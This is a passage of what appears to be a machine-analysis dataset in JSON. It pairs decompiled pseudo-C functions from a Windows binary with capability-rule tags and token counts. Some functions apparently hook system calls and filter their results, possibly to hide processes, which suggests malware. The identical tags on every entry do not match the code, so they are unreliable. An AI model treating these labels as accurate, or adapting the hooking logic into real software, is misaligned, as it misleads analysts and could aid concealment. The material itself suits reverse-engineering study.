return;\n}\n",
        "token_count": 1275
    },
    "0001e4f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001e4f0(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.0001e1c0();\n    iVar1 = fcn.00020a80(arg_10h, 2, 2, &var_14h, 4);\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        iVar1 = fcn.00020a80(arg_10h, 0x4a, 3, &var_ch, 4);\n        if (iVar1 == 0) {\n            var_ch = fcn.000298c0(6, 2);\n        }\n        fcn.00037640(0x800ce5f4, &var_8h, 1);\n        if (var_ch == 0) {\n            if (*0x800ce600 == 0) {\n                var_4h = 0;\n            }\n            else {\n                for (var_10h = 0; (var_10h < *0x800ce600 && (*(*0x800ce604 + var_10h * 8) != var_14h));\n                    var_10h = var_10h + 1) {\n                }\n                for (; var_10h < *0x800ce600 - 1; var_10h = var_10h + 1) {\n                    fcn.000789fc(*0x800ce604 + var_10h * 8, *0x800ce604 + 8 + var_10h * 8, 8);\n                }\n                if (var_10h < *0x800ce600) {\n                    *0x800ce600 = *0x800ce600 - 1;\n                    fcn.00035720(0x800ce604, *0x800ce600 * 8 + 8, *0x800ce600 * 8);\n                }\n            }\n        }\n        else {\n            for (var_10h = 0; var_10h < *0x800ce600; var_10h = var_10h + 1) {\n                if (*(*0x800ce604 + var_10h * 8) == var_14h) {\n                    *(*0x800ce604 + 4 + var_10h * 8) = var_ch;\n                    var_4h = 0;\n                    goto code_r0x0001e6d0;\n                }\n            }\n            iVar1 = fcn.00035720(0x800ce604, *0x800ce600 << 3, *0x800ce600 * 8 + 8);\n            if (iVar1 == -1) {\n                var_4h = 0x21590004;\n            }\n            else {\n                *(*0x800ce604 + *0x800ce600 * 8) = var_14h;\n                *(*0x800ce604 + 4 + *0x800ce600 * 8) = var_ch;\n                *0x800ce600 = *0x800ce600 + 1;\n            }\n        }\ncode_r0x0001e6d0:\n        fcn.00037670(0x800ce5f4, &var_8h, 1);\n    }\n    return var_4h;\n}\n",
        "token_count": 793
    },
    "0001e6f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001e6f0(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    iVar1 = fcn.00020a80(arg_10h, 2, 2, &var_ch, 4);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00020a80(arg_10h, 0x3c, 2, &var_8h, 4);\n        if (iVar1 == 0) {\n            uVar2 = 0x21590066;\n        }\n        else {\n            var_4h = fcn.0001a920(var_ch, var_8h);\n            uVar2 = fcn.00078a2c(var_4h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 262
    },
    "0001e7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001e7b0(int32_t arg_8h)\n\n{\n    fcn.0001d800(0);\n    fcn.00016d90(arg_8h == 0);\n    if (arg_8h != 0) {\n        (**(arg_8h + 0x2c))(arg_8h, 0);\n        fcn.000357f0(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 104
    },
    "0001e830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001e830(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    ushort *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 0;\n    iVar1 = fcn.00020a10(arg_10h, 4, 5, &var_24h, &var_8h);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else {\n        var_4h = fcn.0005c0a0(var_24h, var_8h);\n        if (var_4h == 0) {\n            var_18h = fcn.0005bdc0(var_24h);\n            var_20h = fcn.000356f0(var_18h);\n            if (var_20h == 0) {\n                var_4h = 0x21590004;\n            }\n            else {\n                fcn.00078bfa(var_20h, 0, var_18h);\n                var_4h = fcn.0005bea0(var_20h, var_24h);\n                if (((var_4h == 0) && (var_4h = fcn.0005b790(var_20h, var_20h),  var_4h == 0)) &&\n                   (var_4h = fcn.0005b9a0(0, var_20h),  var_4h == 0)) {\n                    var_ch = fcn.000356c0(0xa8);\n                    if (var_ch == NULL) {\n                        var_4h = 0x21590004;\n                    }\n                    else {\n                        *(var_ch + 6) = var_20h;\n                        *(var_ch + 8) = var_18h;\n                        *var_ch = 0;\n                        var_ch[1] = 0;\n                        *(var_ch + 10) = var_20h;\n                        *(var_ch + 4) = var_18h;\n                        var_1ch = var_24h + *(var_24h + 0x3c);\n                        *(var_ch + 0x16) = var_20h + *(var_1ch + 0x28);\n                        iVar1 = fcn.0001ace0(&var_14h, 0x8005e7b0, var_ch);\n                        if (iVar1 == 0) {\n                            fcn.00037710(&var_14h);\n                        }\n                        var_4h = 0;\n                    }\n                }\n                if (var_4h != 0) {\n                    fcn.000357f0(var_20h);\n                }\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 686
    },
    "0001e9d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t fcn.0001e9d0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t var_4h;\n    \n    if (*0x800cdc57 != '\\0') {\n        return 0;\n    }\n    uVar3 = 0x800ce65c;\n    fcn.00037440(0x800ce65c);\n    uVar2 = 0x800ce5f4;\n    fcn.00037440(0x800ce5f4);\n    var_4h = fcn.0001bb70(uVar2, uVar3, 0xc0000001);\n    if ((var_4h == 0) &&\n       (var_4h = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x800518cc, 0x8005f190, 0x800ce620),  var_4h == 0)) {\n        fcn.00063fd0(*0x800ce620);\n        var_4h = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x800518d8, 0x8005f2d0, 0x800ce614);\n        if (var_4h == 0) {\n            fcn.00063fd0(*0x800ce614);\n            iVar1 = fcn.00035150();\n            if (0x22 < iVar1) {\n                var_4h = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x800518f4, 0x8005f270, 0x800ce628);\n                if (var_4h != 0) goto code_r0x0001eb70;\n                fcn.00063fd0(*0x800ce628);\n            }\n            var_4h = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x80051910, 0x8005f020, 0x800ce618);\n            if (var_4h == 0) {\n                fcn.00063fd0(*0x800ce618);\n                var_4h = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x80051808, 0x8005fcd0, 0x800ce624);\n                if (var_4h == 0) {\n                    fcn.00063fd0(*0x800ce624);\n                    var_4h = fcn.000636c0(*0x8005113c, 0x8005f0d0, 0x800ce61c);\n                    if (var_4h == 0) {\n                        fcn.00063fd0(*0x800ce61c);\n                        *0x800cdc57 = '\\x01';\n                        var_4h = 0;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0001eb70:\n    if (var_4h != 0) {\n        fcn.0001ee10();\n    }\n    return var_4h;\n}\n",
        "token_count": 734
    },
    "0001eb90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001eb90(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*0x800ce670 != '\\0') {\n        return 0;\n    }\n    fcn.00017160();\n    iVar1 = fcn.00034f40(0x80051918, &var_4h);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    var_8h = fcn.00063f70(1, var_4h, 0x80051924, 0x800ce644);\n    if ((((((var_8h == 0) && (var_8h = fcn.00063f70(1, var_4h, 0x8005193c, 0x800ce64c),  var_8h == 0)) &&\n          (var_8h = fcn.00063f70(1, var_4h, 0x80051950, 0x800ce648),  var_8h == 0)) &&\n         ((var_8h = fcn.00063f70(1, var_4h, 0x80051960, 0x800ce638),  var_8h == 0 &&\n          (var_8h = fcn.00063f70(1, var_4h, 0x80051970, 0x800ce63c),  var_8h == 0)))) &&\n        ((var_8h = fcn.00063f70(1, var_4h, 0x80051980, 0x800ce640),  var_8h == 0 &&\n         ((var_8h = fcn.00063f70(1, var_4h, 0x80051990, 0x800ce650),  var_8h == 0 &&\n          (var_8h = fcn.00063f70(1, var_4h, 0x800519a0, 0x800ce658),  var_8h == 0)))))) &&\n       (var_8h = fcn.000635c0(1, var_4h, 0x80051990, 0x8005faf0, 0x800ce630),  var_8h == 0)) {\n        fcn.00063fd0(*0x800ce630);\n        iVar1 = fcn.00035150();\n        if (0x1a < iVar1) {\n            var_8h = fcn.000635c0(1, var_4h, 0x800519bc, 0x8005fba0, 0x800ce62c);\n            if (var_8h != 0) goto code_r0x0001edb6;\n            fcn.00063fd0(*0x800ce62c);\n        }\n        var_8h = fcn.00063f70(1, var_4h, 0x800519d0, 0x800ce654);\n        if ((var_8h == 0) && (var_8h = fcn.000635c0(1, var_4h, 0x800519d0, 0x8005ef70, 0x800ce634),  var_8h == 0)) {\n            fcn.00063fd0(*0x800ce634);\n            *0x800ce670 = '\\x01';\n            var_8h = 0;\n        }\n    }\ncode_r0x0001edb6:\n    if (var_8h != 0) {\n        fcn.00063fd0(*0x800ce634);\n        fcn.00063b20(0x800ce634);\n        fcn.00063fd0(*0x800ce62c);\n        fcn.00063b20(0x800ce62c);\n        fcn.00063fd0(*0x800ce630);\n        fcn.00063b20(0x800ce630);\n    }\n    return var_8h;\n}\n",
        "token_count": 924
    },
    "0001ef70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0001ef70(uint noname_0, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t extraout_ECX;\n    uint var_9h;\n    \n    if (((arg_ch == 0) || (arg_ch == 1)) || (arg_ch == 2)) {\n        var_9h._0_1_ = (**0x800510c8)();\n        if ((var_9h != 0) &&\n           (cVar1 = (**0x80051138)(*(**0x80051148 + 0x88), *(**0x80051148 + 0x8c), extraout_ECX & 0xffffff00 | var_9h), \n           cVar1 == '\\0')) {\n            return 0xc0000061;\n        }\n        *0x800cdc56 = 1;\n        iVar3 = fcn.0001ace0(&var_9h + 1, 0x8005d800, 0);\n        if (iVar3 == 0) {\n            fcn.00037760(&var_9h + 1, 0);\n            fcn.00037710(&var_9h + 1);\n        }\n        fcn.0006d970();\n        uVar2 = (**0x800ce654)(arg_ch);\n    }\n    else {\n        uVar2 = 0xc000000d;\n    }\n    return uVar2;\n}\n",
        "token_count": 342
    },
    "0001f020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001f020(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    if (((arg_ch != 0) && (arg_ch != -1)) && (cVar1 = fcn.0001be10(arg_ch, 1),  cVar1 != '\\0')) {\n        return 0;\n    }\n    if (*0x800cdc56 == '\\0') {\n        fcn.000193e0();\n    }\n    pcVar2 = fcn.00063f30(arg_8h);\n    uVar3 = (*pcVar2)(arg_8h, arg_ch);\n    return uVar3;\n}\n",
        "token_count": 169
    },
    "0001f0d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001f0d0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t in_EDX;\n    uint *puVar4;\n    uint uVar5;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.00033360(arg_ch, in_EDX & 0xffffff00 | arg_14h & 0xff, &var_20h, &var_24h);\n    if (cVar1 == '\\0') {\n        uVar2 = arg_20h & 0xffffff00 | arg_14h & 0xff;\n        pcVar3 = fcn.00063f30(arg_8h);\n        var_24h = (*pcVar3)(arg_8h, arg_ch, arg_10h, uVar2, arg_18h, arg_1ch, arg_20h, arg_24h);\n    }\n    else if (var_24h == 0) {\n        var_18h = 0x18;\n        var_14h = 0;\n        var_ch = *(arg_ch + 0xc);\n        var_10h = &var_20h;\n        var_8h = *(arg_ch + 0x10);\n        var_4h = 0;\n        uVar5 = 0;\n        puVar4 = &var_18h;\n        pcVar3 = fcn.00063f30(arg_8h);\n        var_24h = (*pcVar3)(arg_8h, puVar4, arg_10h, uVar5, arg_18h, arg_1ch, arg_20h, arg_24h);\n        fcn.000339a0(&var_20h);\n    }\n    return var_24h;\n}\n",
        "token_count": 506
    },
    "0001f270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001f270(uint arg_8h, uint arg_ch, int32_t arg_10h, uint32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_10h;\n    puVar3 = arg_14h;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, arg_ch, iVar2, puVar3, arg_18h, arg_1ch);\n    if ((iVar2 == 0) && (arg_10h == 0x22)) {\n        *arg_14h = *arg_14h | 0x20;\n    }\n    return iVar2;\n}\n",
        "token_count": 209
    },
    "0001f2d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001f2d0(uint param_1, int32_t param_2, uint32_t *param_3, int32_t param_4, int32_t *param_5)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    uint32_t *var_10h;\n    int32_t var_14h;\n    int32_t *var_18h_2;\n    uint var_18h;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_64h;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint32_t *var_3ch;\n    uint32_t *var_38h;\n    uint32_t *var_34h;\n    int32_t var_30h;\n    int32_t var_29h;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d00;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    var_30h = 0;\n    var_1ch = 0;\n    bVar3 = false;\n    bVar2 = false;\n    iVar7 = var_ch;\n    puVar8 = var_10h;\n    iVar10 = var_14h;\n    piVar11 = var_18h_2;\n    pcVar5 = fcn.00063f30(var_8h);\n    *NULL = (*pcVar5)(var_8h, iVar7, puVar8, iVar10, piVar11);\n    if ((*NULL != 0) || (cVar4 = fcn.0001fa30(),  cVar4 != '\\0')) goto code_r0x0001f689;\n    var_4h = 0;\n    cVar4 = (**0x800510c8)();\n    if (cVar4 == '\\0') {\ncode_r0x0001f3f1:\n        if (var_18h_2 == NULL) {\n            var_24h = var_14h;\n        }\n        else {\n            var_24h = *var_18h_2;\n        }\n        if (var_ch == 5) {\n            var_34h = var_10h;\n            var_3ch = NULL;\n            do {\n                if (*var_34h == 0) {\n                    var_38h = NULL;\n                }\n                else {\n                    var_38h = var_34h + *var_34h;\n                }\n                if ((var_34h[0xf] == 0) || (iVar7 = fcn.0001f870(var_34h[0xf], var_34h[0x11]),  iVar7 == 0)) {\n                    var_3ch = var_34h;\n                }\n                else if (var_3ch == NULL) {\n                    var_3ch = var_34h;\n                }\n                else if (var_38h == NULL) {\n                    *var_3ch = 0;\n                    var_38h = NULL;\n                }\n                else {\n                    *var_3ch = *var_3ch + *var_34h;\n                }\n                var_34h = var_38h;\n            } while (var_38h != NULL);\n        }\n        else if (var_ch == 0x10) {\n            uVar1 = *var_10h;\n            var_48h = 0;\n            for (var_44h = 0; var_44h < uVar1; var_44h = var_44h + 1) {\n                iVar7 = fcn.0001f9f0(var_10h[var_44h * 4 + 3], var_10h[var_44h * 4 + 1], \n                                     *(var_10h + var_44h * 0x10 + 10));\n                if (iVar7 == 0) {\n                    if (var_44h != var_48h) {\n                        puVar9 = var_10h + var_44h * 4 + 1;\n                        puVar8 = var_10h + var_48h * 4 + 1;\n                        *puVar8 = *puVar9;\n                        puVar8[1] = puVar9[1];\n                        puVar8[2] = puVar9[2];\n                        puVar8[3] = puVar9[3];\n                    }\n                    var_48h = var_48h + 1;\n                }\n            }\n            *var_10h = var_48h;\n            var_24h = var_48h * 4 + 4;\n        }\n        else if (var_ch == 0x40) {\n            uVar1 = *var_10h;\n            var_58h = 0;\n            for (var_54h = 0; var_54h < uVar1; var_54h = var_54h + 1) {\n                iVar7 = fcn.0001f9f0(var_10h[var_54h * 7 + 2], var_10h[var_54h * 7 + 3], var_10h[var_54h * 7 + 4]);\n                if (iVar7 == 0) {\n                    if (var_54h != var_58h) {\n                        puVar8 = var_10h + var_54h * 7 + 1;\n                        puVar9 = var_10h + var_58h * 7 + 1;\n                        for (iVar7 = 7; iVar7 != 0; iVar7 = iVar7 + -1) {\n                            *puVar9 = *puVar8;\n                            puVar8 = puVar8 + 1;\n                            puVar9 = puVar9 + 1;\n                        }\n                    }\n                    var_58h = var_58h + 1;\n                }\n            }\n        }\n        if (var_18h_2 != NULL) {\n            *var_18h_2 = var_24h;\n        }\n    }\n    else {\n        if (var_18h_2 != NULL) {\n            var_30h = (**0x8005128c)(var_18h_2, 4, 0, 0, 0);\n            if (var_30h == 0) {\n                unique0x00007a00 = -0x3fffff66;\n                goto code_r0x0001f689;\n            }\n            uVar6 = (**0x800510c8)(2);\n            (**0x80051298)(var_30h, uVar6);\n            bVar3 = true;\n        }\n        var_1ch = (**0x8005128c)(var_10h, var_14h, 0, 0, 0);\n        if (var_1ch != 0) {\n            uVar6 = (**0x800510c8)(2);\n            (**0x80051298)(var_1ch, uVar6);\n            bVar2 = true;\n            goto code_r0x0001f3f1;\n        }\n        stack0xffffffd4 = -0x3fffff66;\n    }\n    var_4h = 0xffffffff;\n    if (bVar2) {\n        (**0x80051294)(var_1ch);\n    }\n    if (var_1ch != 0) {\n        (**0x800512a4)(var_1ch);\n    }\n    if (bVar3) {\n        (**0x80051294)(var_30h);\n    }\n    if (var_30h != 0) {\n        (**0x800512a4)(var_30h);\n    }\ncode_r0x0001f689:\n    *in_FS_OFFSET = var_10h_2;\n    return *NULL;\n}\n",
        "token_count": 1904
    },
    "0001f6a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001f6a0(uint arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    char *var_14h;\n    uint var_10h;\n    uint var_8h;\n    char *var_4h;\n    \n    if (*0x800ce674 == NULL) {\n        fcn.0002c030(0x800ccec0, 0x52);\n        var_4h = 0x800ccec0;\n        pcVar1 = var_4h;\n        do {\n            var_4h = pcVar1;\n            pcVar1 = var_4h + 1;\n        } while (*var_4h != '\\0');\n        *0x800ce674 = var_4h + 0x7ff33140;\n        fcn.0002c060(0x800ccfc8, 0x52);\n        var_14h = 0x800ccfc8;\n        pcVar1 = var_14h;\n        do {\n            var_14h = pcVar1;\n            pcVar1 = var_14h + 1;\n        } while (*var_14h != '\\0');\n        *0x800ccf14 = var_14h + 0x7ff33038;\n    }\n    iVar2 = fcn.00078a3e(arg_8h, 0x800ccec0, *0x800ce674);\n    if ((iVar2 != 0) && (iVar2 = fcn.00078a3e(arg_8h, 0x800ccfc8, *0x800ccf14),  iVar2 != 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 405
    },
    "0001f780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001f780(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    int16_t *var_14h;\n    uint var_10h;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    if (*0x800ce678 == 0) {\n        fcn.0002c090(0x800cd020, 0x52);\n        var_4h = 0x800cd020;\n        piVar1 = var_4h;\n        do {\n            var_4h = piVar1;\n            piVar1 = var_4h + 1;\n        } while (*var_4h != 0);\n        *0x800ce678 = var_4h + 0x3ff997f0 >> 1;\n        fcn.0002c0c0(0x800ccf20, 0x52);\n        var_14h = 0x800ccf20;\n        piVar1 = var_14h;\n        do {\n            var_14h = piVar1;\n            piVar1 = var_14h + 1;\n        } while (*var_14h != 0);\n        *0x800ccf18 = var_14h + 0x3ff99870 >> 1;\n    }\n    iVar2 = fcn.000364d0(arg_8h, 0x800cd020, *0x800ce678);\n    if ((iVar2 != 0) && (iVar2 = fcn.000364d0(arg_8h, 0x800ccf20, *0x800ccf18),  iVar2 != 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 414
    },
    "0001f870": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001f870(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_11ch;\n    uint var_118h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_11ch = fcn.0001f780(arg_8h);\n    if (var_11ch == 0) {\n        fcn.00037640(0x800ce5f4, &var_4h, 0);\n        var_8h = *0x800ce600;\n        for (var_10h = 0; var_10h < *0x800ce600; var_10h = var_10h + 1) {\n            if (*(*0x800ce604 + var_10h * 8) == arg_ch) {\n                var_ch = *(*0x800ce604 + 4 + var_10h * 8);\n                break;\n            }\n        }\n        fcn.00037670(0x800ce5f4, &var_4h, 0);\n        if (var_8h <= var_10h) {\n            return 0;\n        }\n    }\n    else {\n        var_ch = *0x800ce610;\n    }\n    if (var_ch == 1) {\n        var_11ch = 1;\n    }\n    else if (var_ch == 0) {\n        var_11ch = 0;\n    }\n    else if (var_ch == 2) {\n        var_11ch = 0;\n        iVar1 = fcn.00036d40(&var_118h, 0x104);\n        if (iVar1 == 0) {\n            var_11ch = 1;\n        }\n        else {\n            fcn.00078ab6(&var_118h);\n            for (var_10h = 0; var_10h < *0x800ce608; var_10h = var_10h + 1) {\n                iVar1 = fcn.00078abc(&var_118h, *(*0x800ce60c + var_10h * 4));\n                if (iVar1 != 0) {\n                    return 1;\n                }\n            }\n        }\n    }\n    return var_11ch;\n}\n",
        "token_count": 533
    },
    "0001faf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001faf0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint32_t arg_28h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_EAX & 0xffffff00 | arg_28h & 0xff;\n    uVar4 = arg_18h;\n    pcVar2 = fcn.00063f30(arg_8h);\n    var_1ch = (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h, uVar4, arg_1ch, arg_20h, arg_24h, uVar1);\n    if (var_1ch == 0) {\n        iVar3 = (**0x8005129c)(arg_18h, 0, 0, 0, &var_24h, 0);\n        if (iVar3 == 0) {\n            var_20h = var_24h + 0x50;\n            if (*(var_24h + 0x54) == *var_20h) {\n                iVar3 = fcn.00078a50(arg_18h, 0, &var_18h, 0x18, 0);\n                if (iVar3 == 0) {\n                    fcn.0001fe20(var_4h, var_8h, 1);\n                }\n            }\n            (**0x800512e0)();\n        }\n    }\n    return var_1ch;\n}\n",
        "token_count": 441
    },
    "0001fba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001fba0(uint param_1, uint *param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n                    uint param_8, uint param_9, uint param_10, uint param_11, uint param_12)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint *var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_1ch;\n    uint var_20h;\n    uint var_24h;\n    uint var_28h;\n    uint var_2ch;\n    uint var_30h;\n    uint var_18h;\n    uint *puVar4;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h_2;\n    uint var_20h_2;\n    uint var_1ch_2;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8e10;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffb0;\n    puVar4 = var_ch;\n    pcVar2 = fcn.00063f30(var_8h);\n    var_34h = (*pcVar2)(var_8h, puVar4, var_10h, var_14h, var_18h_2, var_1ch, var_20h, var_24h, var_28h, var_2ch, \n                        var_30h, var_18h);\n    if (var_34h == 0) {\n        cVar1 = 